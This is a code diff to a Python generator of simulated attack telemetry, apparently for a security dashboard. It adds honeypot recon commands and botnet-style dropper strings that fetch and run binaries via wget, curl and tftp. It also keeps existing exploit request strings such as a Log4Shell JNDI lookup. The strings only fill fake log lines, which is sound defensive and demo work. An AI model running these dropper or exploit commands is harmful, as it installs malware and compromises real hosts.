@@ -30,6 +30,11 @@ EXPLOITS = ["GET /?x=${jndi:ldap://{ip}:1389/a}", "GET /cgi-bin/.%2e/.%2e/.%2e/.
             "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array"]
 CRAWLERS = ["GPTBot/1.2", "ClaudeBot/1.0", "CCBot/2.0", "Bytespider",
             "Mozilla/5.0 (Windows NT 10.0) Chrome/120.0 (headless)"]
+RECON = ["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "free -m | grep Mem", "nproc", "whoami",
+         "ls -lh $(which ls)", "crontab -l", "cat /etc/os-release"]
+PAYLOADS = ["cd /tmp; wget http://{ip}/bins.sh; chmod +x bins.sh; ./bins.sh",
+            "curl -fsSL http://{ip}/x86_64 -o /dev/shm/.x && chmod +x /dev/shm/.x && /dev/shm/.x",
+            "cd /var/tmp && tftp -g -r mips {ip} && chmod 777 mips && ./mips"]
 ACCOUNTS = ["alex@contoso.com", "sam@contoso.com", "jordan@contoso.com", "lee@contoso.com",
             "pat@contoso.com", "chris@contoso.com", "morgan@contoso.com", "taylor@contoso.com"]
 
@@ -40,7 +45,12 @@ TARGETS = {
     "exploit_attempt": "web app :443",
     "ai_crawler": "web app :443",
     "credential_stuffing": "web login /login",
+    "shell_recon": "honeypot ssh :22",
+    "malware_download": "honeypot ssh :22",
 }
+
+# Attacks that only happen after a successful login: always "got through" (into the fake shell).
+AFTER_LOGIN = {"shell_recon", "malware_download"}
 
 # How often each attack shows up (relative weight) and its burst size range.
 MIX = {
@@ -50,6 +60,8 @@ MIX = {
     "password_spray": (8, (8, 40)),
     "credential_stuffing": (8, (20, 200)),
     "exploit_attempt": (7, (1, 6)),
+    "shell_recon": (6, (2, 10)),
+    "malware_download": (3, (1, 3)),
 }
 
 
@@ -71,6 +83,10 @@ def _evidence(attack, ip, count, when, rng):
         agent = rng.choice(CRAWLERS)
         return [f'{ip} - - [{ts}] "GET /docs/page-{rng.randint(1, 400)} HTTP/1.1" 200 18342 "-" "{agent}"'
                 for _ in range(n)]
+    if attack == "shell_recon":
+        return [f"{ts} cowrie CMD: {c} src={ip}" for c in rng.sample(RECON, n)]
+    if attack == "malware_download":
+        return [f"{ts} cowrie CMD: {rng.choice(PAYLOADS).replace('{ip}', ip)} src={ip}"]
     if attack == "credential_stuffing":
         return [f'{ip} - - [{ts}] "POST /login HTTP/1.1" 401 0 user={a}' for a in rng.sample(ACCOUNTS, n)]
     return []
@@ -100,8 +116,8 @@ class SampleSource:
         rng = self.rng
         expected = self.rate * seconds / 60
         n = int(expected) + (rng.random() < expected % 1)
-        if rng.random() < 0.05:  # botnets come and go
-            self.campaigns[rng.randrange(len(self.campaigns))] = self._campaign()
+        if rng.random() < 0.05:  # the extra botnets come and go; one per attack type always stays
+            self.campaigns[rng.randrange(len(MIX), len(self.campaigns))] = self._campaign()
         events = []
         weights = [MIX[c["attack"]][0] for c in self.campaigns]
         for _ in range(n):
@@ -115,7 +131,8 @@ class SampleSource:
                 time=when, attack=c["attack"], source_ip=ip, country=country, city=city,
                 lat=lat + rng.uniform(-0.6, 0.6), lon=lon + rng.uniform(-0.6, 0.6),
                 target=TARGETS[c["attack"]], count=count,
-                blocked=rng.random() > (0.15 if c["attack"] == "exploit_attempt" else 0.03),
+                blocked=(c["attack"] not in AFTER_LOGIN
+                         and rng.random() > (0.15 if c["attack"] == "exploit_attempt" else 0.03)),
                 evidence=_evidence(c["attack"], ip, count, when, rng),
             ))
         return sorted(events, key=lambda e: e.time)
